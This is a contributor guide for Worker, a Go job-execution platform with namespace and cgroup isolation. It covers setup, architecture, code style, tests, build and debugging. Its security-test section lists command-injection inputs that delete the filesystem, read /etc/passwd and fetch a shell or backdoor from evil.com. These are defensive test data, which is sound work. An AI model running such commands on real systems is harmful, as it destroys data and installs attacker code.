# Contributing to Worker

Thank you for your interest in contributing to Worker! This guide provides comprehensive information for developers and
technical contributors working on the Worker distributed job execution platform.

## Table of Contents

- [Development Environment](#development-environment)
- [Architecture Overview](#architecture-overview)
- [Development Workflow](#development-workflow)
- [Code Standards](#code-standards)
- [Testing Strategy](#testing-strategy)
- [Component Development](#component-development)
- [Build System](#build-system)
- [Debugging](#debugging)
- [Performance](#performance)
- [Security](#security)

## Development Environment

### Prerequisites

- **Go 1.24+** with modules enabled
- **Protocol Buffers** compiler (`protoc`) with Go plugins
- **Linux environment** for full testing (WSL2/VM acceptable)
- **Make** for build automation
- **Git** with GPG signing configured
- **OpenSSL** for certificate generation

### Initial Setup

```bash
# Clone and setup development environment
git clone https://github.com/ehsaniara/worker.git
cd worker

# Install Go dependencies
go mod download

# Install development tools
go install github.com/golangci/golangci-lint/cmd/golangci-lint@latest
go install google.golang.org/protobuf/cmd/protoc-gen-go@latest
go install google.golang.org/grpc/cmd/protoc-gen-go-grpc@latest
go install github.com/maxbrunsfeld/counterfeiter/v6@latest

# Setup development environment with certificates
make setup-dev

# Run full test suite
go test -v -race ./...
```

### Development Dependencies

```bash
# Protocol Buffer tools
apt-get install -y protobuf-compiler  # Ubuntu/Debian
brew install protobuf                  # macOS

# Verify installation
protoc --version
golangci-lint version
```

## Architecture Overview

### Core Components

Understanding the Worker architecture is crucial for effective development:

```
┌─────────────────┐    ┌─────────────────┐    ┌─────────────────┐
│   CLI Client    │    │  Worker Server  │    │   Job Process   │
│  (any platform) │    │  (Linux only)   │    │  (Linux only)   │
├─────────────────┤    ├─────────────────┤    ├─────────────────┤
│ • gRPC Client   │◄──►│ • gRPC Server   │    │ • Init Mode     │
│ • TLS Auth      │    │ • Job Manager   │    │ • Namespaces    │
│ • Streaming     │    │ • State Store   │    │ • Cgroups       │
│ • CLI Commands  │    │ • Resource Mgmt │    │ • Process Exec  │
└─────────────────┘    └─────────────────┘    └─────────────────┘
```

### Key Design Patterns

1. **Single Binary Architecture**: Same executable runs in server or init mode
2. **Platform Abstraction**: Interface-based design for cross-platform compatibility
3. **Namespace Isolation**: Complete process isolation using Linux namespaces
4. **Real-time Streaming**: Pub/sub pattern for live log streaming
5. **Resource Management**: Linux cgroups v2 for CPU/memory/IO limiting

### Directory Structure

```
internal/
├── modes/                    # Execution modes (server/init)
│   ├── server.go            # Server mode implementation
│   ├── jobexec.go           # Job execution logic
│   └── isolation.go         # Namespace setup
├── worker/
│   ├── core/linux/          # Linux-specific implementations
│   │   ├── resource/        # Cgroup management
│   │   ├── process/         # Process lifecycle
│   │   └── unprivileged/    # Namespace isolation
│   ├── server/              # gRPC server
│   ├── auth/                # Authentication/authorization
│   ├── state/               # Job state management
│   └── domain/              # Business logic
├── cli/                     # CLI client implementation
pkg/
├── platform/                # Platform abstraction layer
├── config/                  # Configuration management
└── logger/                  # Structured logging
```

## Development Workflow

### Branch Strategy

```bash
# Create feature branch
git checkout main
git pull upstream main
git checkout -b feature/issue-123-job-timeout

# Branch naming conventions:
# feature/issue-N-description    # New features
# bugfix/issue-N-description     # Bug fixes
# refactor/component-name        # Code refactoring
# docs/section-name              # Documentation
```

### Development Cycle

```bash
# 1. Make changes
# 2. Run tests early and often
go test -v ./internal/worker/core/...

# 3. Test specific components
go test -v ./internal/worker/state/ -run TestStore

# 4. Run linting
golangci-lint run

# 5. Build and test integration
make all
./bin/worker &
./bin/worker-cli run echo "test"

# 6. Commit with conventional format
git commit -m "feat(core): add job timeout configuration

- Add timeout field to job domain model
- Implement timeout handling in process manager
- Add configuration validation for timeout values

Fixes #123"
```

### Code Generation

Worker uses code generation for mocks and protocol buffers:

```bash
# Generate mocks for testing
go generate ./...

# Regenerate protocol buffers (if .proto files change)
protoc --go_out=. --go-grpc_out=. api/worker.proto

# Verify generated code is up to date
git diff --exit-code
```

## Code Standards

### Go Code Style

Follow the Worker-specific conventions:

```go
// Package structure
package worker

import (
	// Standard library
	"context"
	"fmt"
	"time"

	// Third-party (gRPC, etc.)
	"google.golang.org/grpc"

	// Internal packages
	"worker/internal/worker/domain"
	"worker/pkg/logger"
)

// Interface definitions with documentation
type JobWorker interface {
	// StartJob creates and starts a new job with the specified parameters.
	// It returns the created job or an error if job creation fails.
	StartJob(ctx context.Context, command string, args []string,
		maxCPU, maxMemory, maxIOBPS int32) (*domain.Job, error)

	// StopJob terminates a running job gracefully or forcefully.
	StopJob(ctx context.Context, jobId string) error
}

// Implementation with proper logging
type worker struct {
	store    interfaces.Store
	cgroup   resource.Resource
	platform platform.Platform
	logger   *logger.Logger
}

// Constructor with dependency injection
func NewWorker(store interfaces.Store, cfg *config.Config) interfaces.Worker {
	return &worker{
		store:    store,
		cgroup:   resource.New(cfg.Cgroup),
		platform: platform.NewPlatform(),
		logger:   logger.WithField("component", "worker"),
	}
}
```

### Error Handling Patterns

```go
// Define structured errors
var (
ErrJobNotFound = errors.New("job not found")
ErrInvalidCommand = errors.New("invalid command")
)

// Proper error wrapping with context
func (w *worker) StartJob(ctx context.Context, command string, args []string,
maxCPU, maxMemory, maxIOBPS int32) (*domain.Job, error) {

if command == "" {
return nil, fmt.Errorf("start job failed: %w", ErrInvalidCommand)
}

job, err := w.createJob(command, args, maxCPU, maxMemory, maxIOBPS)
if err != nil {
return nil, fmt.Errorf("failed to create job: %w", err)
}

if err := w.platform.SetupCgroup(job.CgroupPath, job.Limits); err != nil {
w.cleanup(job)
return nil, fmt.Errorf("cgroup setup failed for job %s: %w", job.Id, err)
}

return job, nil
}
```

### Logging Standards

```go
// Structured logging with context
func (w *worker) processJob(job *domain.Job) {
log := w.logger.WithFields(
"jobId", job.Id,
"command", job.Command,
"limits", job.Limits,
)

log.Info("starting job processing")

startTime := time.Now()
if err := w.executeJob(job); err != nil {
duration := time.Since(startTime)
log.Error("job execution failed", "error", err, "duration", duration)
return
}

duration := time.Since(startTime)
log.Info("job processing completed", "duration", duration)
}
```

## Testing Strategy

### Test Categories

Worker uses a multi-layered testing approach:

#### 1. Unit Tests

```go
// Test file: internal/worker/state/store_test.go
func TestStore_CreateNewJob(t *testing.T) {
tests := []struct {
name     string
job      *domain.Job
wantErr  bool
validate func (t *testing.T, store Store)
}{
{
name: "creates new job successfully",
job: &domain.Job{
Id:      "test-1",
Command: "echo",
Args:    []string{"hello"},
Status:  domain.StatusInitializing,
},
wantErr: false,
validate: func (t *testing.T, store Store) {
job, exists := store.GetJob("test-1")
assert.True(t, exists)
assert.Equal(t, "echo", job.Command)
assert.Equal(t, domain.StatusInitializing, job.Status)
},
},
{
name: "prevents duplicate job creation",
job: &domain.Job{
Id:      "test-1", // Same ID as previous
Command: "ls",
},
wantErr: false, // Store should ignore duplicates
validate: func (t *testing.T, store Store) {
job, exists := store.GetJob("test-1")
assert.True(t, exists)
assert.Equal(t, "echo", job.Command) // Original command preserved
},
},
}

for _, tt := range tests {
t.Run(tt.name, func (t *testing.T) {
store := state.New()

store.CreateNewJob(tt.job)

if tt.validate != nil {
tt.validate(t, store)
}
})
}
}
```

#### 2. Integration Tests

```go
// Test file: test/integration/worker_test.go
// +build integration

func TestWorker_JobLifecycle(t *testing.T) {
if runtime.GOOS != "linux" {
t.Skip("Integration tests require Linux")
}

// Setup test environment
cfg := testConfig(t)
store := state.New()
worker := core.NewWorker(store, cfg)

ctx, cancel := context.WithTimeout(context.Background(), 30*time.Second)
defer cancel()

// Create job
job, err := worker.StartJob(ctx, "echo", []string{"integration-test"}, 50, 256, 0)
require.NoError(t, err)
require.NotNil(t, job)
assert.Equal(t, domain.StatusInitializing, job.Status)

// Wait for job to complete
require.Eventually(t, func () bool {
currentJob, exists := store.GetJob(job.Id)
return exists && currentJob.IsCompleted()
}, 10*time.Second, 100*time.Millisecond)

// Verify final state
finalJob, exists := store.GetJob(job.Id)
require.True(t, exists)
assert.Equal(t, domain.StatusCompleted, finalJob.Status)
assert.Equal(t, int32(0), finalJob.ExitCode)

// Verify output
output, isRunning, err := store.GetOutput(job.Id)
require.NoError(t, err)
assert.False(t, isRunning)
assert.Contains(t, string(output), "integration-test")
}
```

#### 3. End-to-End Tests

```bash
# E2E test script: scripts/e2e-test.sh
#!/bin/bash
set -e

echo "Starting E2E tests..."

# Start server in background
./bin/worker &
SERVER_PID=$!
trap "kill $SERVER_PID" EXIT

# Wait for server to start
sleep 2

# Test basic job execution
echo "Testing basic job execution..."
JOB_ID=$(./bin/worker-cli run echo "e2e-test" | grep "ID:" | cut -d' ' -f2)

# Test job status
echo "Testing job status..."
./bin/worker-cli status "$JOB_ID"

# Test job listing
echo "Testing job listing..."
./bin/worker-cli list | grep "$JOB_ID"

# Test log streaming
echo "Testing log streaming..."
./bin/worker-cli log "$JOB_ID" | grep "e2e-test"

echo "E2E tests completed successfully!"
```

### Running Tests

```bash
# Unit tests with coverage
go test -v -race -coverprofile=coverage.out ./...
go tool cover -html=coverage.out

# Integration tests (Linux only)
go test -v -tags=integration ./test/integration/...

# Specific component tests
go test -v ./internal/worker/core/linux/resource/...

# Benchmark tests
go test -bench=. -benchmem ./internal/worker/state/

# E2E tests
./scripts/e2e-test.sh
```

### Test Utilities

```go
// test/testutil/helpers.go
package testutil

import (
	"testing"
	"time"
	"worker/internal/worker/domain"
	"worker/pkg/config"
	"worker/pkg/logger"
)

// TestJob creates a test job with sensible defaults
func TestJob(t *testing.T, overrides ...func(*domain.Job)) *domain.Job {
	t.Helper()

	job := &domain.Job{
		Id:      fmt.Sprintf("test-%d", time.Now().UnixNano()),
		Command: "echo",
		Args:    []string{"test"},
		Limits: domain.ResourceLimits{
			MaxCPU:    50,
			MaxMemory: 128,
			MaxIOBPS:  0,
		},
		Status:    domain.StatusInitializing,
		StartTime: time.Now(),
	}

	for _, override := range overrides {
		override(job)
	}

	return job
}

// TestConfig creates a test configuration
func TestConfig(t *testing.T) *config.Config {
	t.Helper()

	cfg := config.DefaultConfig
	cfg.Worker.MaxConcurrentJobs = 5
	cfg.Worker.JobTimeout = 30 * time.Second
	cfg.Logging.Level = "DEBUG"

	return &cfg
}

// TestLogger creates a test logger that captures output
func TestLogger(t *testing.T) *logger.Logger {
	t.Helper()

	return logger.NewWithConfig(logger.Config{
		Level:  logger.DEBUG,
		Format: "text",
		Output: testWriter{t: t},
	})
}

type testWriter struct {
	t *testing.T
}

func (w testWriter) Write(p []byte) (n int, err error) {
	w.t.Logf("LOG: %s", string(p))
	return len(p), nil
}
```

## Component Development

### Adding New Features

When adding new features, follow the established patterns:

#### 1. Domain Model First

```go
// internal/worker/domain/job.go
type Job struct {
// ... existing fields ...

// New field with proper documentation
Timeout time.Duration `json:"timeout"` // Maximum execution time
}

// Add business logic methods
func (j *Job) IsTimedOut() bool {
if j.Timeout == 0 {
return false // No timeout set
}
return time.Since(j.StartTime) > j.Timeout
}

func (j *Job) RemainingTime() time.Duration {
if j.Timeout == 0 {
return 0 // No timeout
}
elapsed := time.Since(j.StartTime)
if elapsed >= j.Timeout {
return 0
}
return j.Timeout - elapsed
}
```

#### 2. Interface Definition

```go
// internal/worker/core/interfaces/worker.go
type Worker interface {
StartJob(ctx context.Context, command string, args []string,
maxCPU, maxMemory, maxIOBPS int32) (*domain.Job, error)
StopJob(ctx context.Context, jobId string) error

// New method
SetJobTimeout(ctx context.Context, jobId string, timeout time.Duration) error
}
```

#### 3. Implementation

```go
// internal/worker/core/linux/worker.go
func (w *Worker) SetJobTimeout(ctx context.Context, jobId string, timeout time.Duration) error {
log := w.logger.WithFields("jobId", jobId, "timeout", timeout)
log.Debug("setting job timeout")

// Validate input
if timeout < 0 {
return fmt.Errorf("timeout cannot be negative: %v", timeout)
}

// Get job
job, exists := w.store.GetJob(jobId)
if !exists {
return fmt.Errorf("job not found: %s", jobId)
}

if !job.IsRunning() {
return fmt.Errorf("cannot set timeout for non-running job: %s", jobId)
}

// Update job
updatedJob := job.DeepCopy()
updatedJob.Timeout = timeout
w.store.UpdateJob(updatedJob)

log.Info("job timeout updated")
return nil
}
```

#### 4. API Integration

```protobuf
// api/worker.proto
service JobService {
  // ... existing methods ...

  rpc SetJobTimeout(SetJobTimeoutReq) returns (SetJobTimeoutRes);
}

message SetJobTimeoutReq {
  string id = 1;
  int64 timeoutSeconds = 2;
}

message SetJobTimeoutRes {
  string id = 1;
  int64 timeoutSeconds = 2;
  string status = 3;
}
```

#### 5. CLI Command

```go
// internal/cli/timeout.go
func newTimeoutCmd() *cobra.Command {
cmd := &cobra.Command{
Use:   "timeout <job-id> <timeout-seconds>",
Short: "Set timeout for a running job",
Args:  cobra.ExactArgs(2),
RunE:  runTimeout,
}
return cmd
}

func runTimeout(cmd *cobra.Command, args []string) error {
jobID := args[0]
timeoutSec, err := strconv.ParseInt(args[1], 10, 64)
if err != nil {
return fmt.Errorf("invalid timeout: %v", err)
}

client, err := createClient()
if err != nil {
return err
}
defer client.Close()

ctx, cancel := context.WithTimeout(context.Background(), 10*time.Second)
defer cancel()

response, err := client.SetJobTimeout(ctx, &pb.SetJobTimeoutReq{
Id:             jobID,
TimeoutSeconds: timeoutSec,
})
if err != nil {
return fmt.Errorf("failed to set job timeout: %v", err)
}

fmt.Printf("Timeout set successfully:\n")
fmt.Printf("Job ID: %s\n", response.Id)
fmt.Printf("Timeout: %d seconds\n", response.TimeoutSeconds)

return nil
}
```

### Platform-Specific Development

When adding platform-specific functionality:

```go
// pkg/platform/timeout_linux.go
//go:build linux

package platform

import (
	"context"
	"syscall"
	"time"
)

func (lp *LinuxPlatform) SetProcessTimeout(pid int32, timeout time.Duration) error {
	// Linux-specific timeout implementation using timerfd
	return lp.setTimerFD(pid, timeout)
}

// pkg/platform/timeout_darwin.go
//go:build darwin

package platform

import (
"context"
"time"
)

func (dp *DarwinPlatform) SetProcessTimeout(pid int32, timeout time.Duration) error {
	// macOS implementation (development only)
	dp.logger.Warn("timeout not supported on macOS", "pid", pid)
	return nil
}
```

## Build System

### Makefile Targets

The project uses Make for consistent builds:

```makefile
# Development targets
.PHONY: dev test lint build clean

dev: setup-dev
	@echo "Development environment ready"

test:
	go test -v -race ./...

test-integration:
	go test -v -tags=integration ./test/integration/...

lint:
	golangci-lint run --timeout 5m

build: worker cli
	@echo "Build completed"

worker:
	CGO_ENABLED=0 GOOS=linux GOARCH=amd64 go build -ldflags="-w -s" -o bin/worker ./cmd/worker

cli:
	go build -ldflags="-w -s" -o bin/worker-cli ./cmd/cli

# Platform-specific builds
build-linux:
	GOOS=linux GOARCH=amd64 go build -o bin/worker-linux ./cmd/worker
	GOOS=linux GOARCH=amd64 go build -o bin/worker-cli-linux ./cmd/cli

build-darwin:
	GOOS=darwin GOARCH=amd64 go build -o bin/worker-cli-darwin ./cmd/cli

# Code generation
generate:
	go generate ./...
	protoc --go_out=. --go-grpc_out=. api/worker.proto

# Development setup
setup-dev: generate build certs-local
	@echo "✅ Development environment setup complete"

certs-local:
	@./etc/certs_gen.sh

clean:
	rm -rf bin/
	rm -rf certs/
	go clean -cache
```

### Build Flags and Optimization

```bash
# Development build (with debug info)
go build -race -o bin/worker-dev ./cmd/worker

# Production build (optimized)
CGO_ENABLED=0 go build -ldflags="-w -s -X main.version=${VERSION}" -o bin/worker ./cmd/worker

# Static binary for containers
CGO_ENABLED=0 GOOS=linux go build -a -installsuffix cgo -ldflags="-w -s" -o bin/worker ./cmd/worker
```

## Debugging

### Development Debugging

```bash
# Run server with debug logging
WORKER_LOG_LEVEL=DEBUG ./bin/worker

# Debug specific component
go test -v -run TestStore_CreateNewJob ./internal/worker/state/

# Race condition detection
go test -race ./...

# CPU profiling
go test -cpuprofile=cpu.prof -bench=. ./internal/worker/state/
go tool pprof cpu.prof

# Memory profiling
go test -memprofile=mem.prof -bench=. ./internal/worker/state/
go tool pprof mem.prof
```

### Production Debugging

```bash
# Enable debug mode in production
sudo systemctl edit worker
# Add: Environment=WORKER_LOG_LEVEL=DEBUG

# Monitor job execution
sudo journalctl -u worker -f | grep "jobId"

# Check cgroup resources
find /sys/fs/cgroup -name "job-*" -exec cat {}/memory.current \;

# Debug certificate issues
openssl s_client -connect localhost:50051 -cert certs/client-cert.pem -key certs/client-key.pem
```

### Debugging Tools

```go
// debug/trace.go - Add to any component for detailed tracing
package debug

import (
	"runtime/trace"
	"os"
)

func StartTrace(name string) func() {
	f, err := os.Create(fmt.Sprintf("trace-%s.out", name))
	if err != nil {
		panic(err)
	}

	trace.Start(f)

	return func() {
		trace.Stop()
		f.Close()
	}
}

// Usage in tests or development
func TestWithTrace(t *testing.T) {
	stop := debug.StartTrace("store-test")
	defer stop()

	// Test code here
}
```

## Performance

### Performance Guidelines

1. **Memory Management**
    - Minimize allocations in hot paths
    - Use object pools for frequently created objects
    - Monitor goroutine leaks

2. **Concurrency**
    - Use context for cancellation
    - Prefer channels over shared memory
    - Implement proper backpressure

3. **I/O Optimization**
    - Buffer I/O operations
    - Use streaming for large data
    - Implement connection pooling

### Benchmarking

```go
// internal/worker/state/store_bench_test.go
func BenchmarkStore_CreateNewJob(b *testing.B) {
store := state.New()

b.ResetTimer()
b.RunParallel(func (pb *testing.PB) {
i := 0
for pb.Next() {
job := &domain.Job{
Id:      fmt.Sprintf("bench-%d", i),
Command: "echo",
Status:  domain.StatusInitializing,
}
store.CreateNewJob(job)
i++
}
})
}

func BenchmarkStore_GetJob(b *testing.B) {
store := state.New()

// Setup
for i := 0; i < 1000; i++ {
job := &domain.Job{
Id:      fmt.Sprintf("job-%d", i),
Command: "echo",
Status:  domain.StatusRunning,
}
store.CreateNewJob(job)
}

b.ResetTimer()
b.RunParallel(func (pb *testing.PB) {
i := 0
for pb.Next() {
jobId := fmt.Sprintf("job-%d", i%1000)
_, exists := store.GetJob(jobId)
if !exists {
b.Errorf("job not found: %s", jobId)
}
i++
}
})
}
```

### Performance Monitoring

```go
// pkg/metrics/metrics.go
package metrics

import (
	"sync/atomic"
	"time"
)

// Simple metrics collection
type Metrics struct {
	JobsCreated   int64
	JobsCompleted int64
	JobsFailed    int64

	TotalDuration time.Duration
	lastUpdate    time.Time
}

func (m *Metrics) JobCreated() {
	atomic.AddInt64(&m.JobsCreated, 1)
}

func (m *Metrics) JobCompleted(duration time.Duration) {
	atomic.AddInt64(&m.JobsCompleted, 1)
	// Note: This is not thread-safe for simplicity
	m.TotalDuration += duration
}

func (m *Metrics) JobFailed() {
	atomic.AddInt64(&m.JobsFailed, 1)
}

func (m *Metrics) Stats() map[string]interface{} {
	return map[string]interface{}{
		"jobs_created":   atomic.LoadInt64(&m.JobsCreated),
		"jobs_completed": atomic.LoadInt64(&m.JobsCompleted),
		"jobs_failed":    atomic.LoadInt64(&m.JobsFailed),
		"avg_duration":   m.TotalDuration / time.Duration(atomic.LoadInt64(&m.JobsCompleted)),
	}
}
```

## Security

### Security Development Practices

1. **Input Validation**
    - Validate all user inputs
    - Sanitize command strings
    - Limit resource requests

2. **Certificate Management**
    - Use strong key sizes (2048+ RSA, 256+ ECDSA)
    - Implement certificate rotation
    - Validate certificate chains

3. **Process Isolation**
    - Use minimal privileges
    - Implement proper namespace isolation
    - Clean up resources thoroughly

### Security Testing

```go
// test/security/security_test.go
func TestCommandInjection(t *testing.T) {
maliciousCommands := []string{
"echo test; rm -rf /",
"echo test && cat /etc/passwd",
"$(curl evil.com/shell)",
"`wget evil.com/backdoor`",
}

worker := setupTestWorker(t)

for _, cmd := range maliciousCommands {
t.Run(fmt.Sprintf("command_%s", cmd), func (t *testing.T) {
_, err := worker.StartJob(context.Background(), cmd, nil, 0, 0, 0)
// Should either reject the command or safely execute it in isolation
if err == nil {
// If accepted, verify it runs in isolation
// Implementation depends on command validation strategy
}
})
}
}

func TestResourceLimits(t *testing.T) {
tests := []struct {
name      string
maxMemory int32
expectErr bool
}{
{"normal_limit", 512, false},
{"excessive_limit", 999999999, true},
{"negative_limit", -1, true},
}

worker := setupTestWorker(t)

for _, tt := range tests {
t.Run(tt.name, func (t *testing.T) {
_, err := worker.StartJob(context.Background(), "echo", []string{"test"},
0, tt.maxMemory, 0)

if tt.expectErr {
assert.Error(t, err)
} else {
assert.NoError(t, err)
}
})
}
}
```

### Code Review Checklist

Before submitting PRs, ensure:

- [ ] All tests pass (`go test -race ./...`)
- [ ] Linting passes (`golangci-lint run`)
- [ ] Security implications considered
- [ ] Documentation updated
- [ ] Performance impact assessed
- [ ] Error handling is comprehensive
- [ ] Logging is appropriate
- [ ] Resource cleanup is implemented
- [ ] Platform compatibility maintained

### Submitting Changes

```bash
# Prepare for submission
go test -race ./...
golangci-lint run
go mod tidy

# Commit with detailed message
git commit -m "feat(core): implement job timeout functionality

- Add timeout field to Job domain model
- Implement timeout monitoring in process manager
- Add SetJobTimeout API method and CLI command
- Include comprehensive tests for timeout scenarios
- Update documentation with timeout examples

The timeout feature allows administrators to set maximum
execution time for jobs, preventing runaway processes from
consuming resources indefinitely.

Fixes #123
Addresses security concern raised in #456"

# Push and create PR
git push origin feature/issue-123-job-timeout
# Create PR via GitHub UI with detailed description
```

---

**Thank you for contributing to Worker!** Your efforts help make distributed job execution more secure, reliable, and
performant for everyone.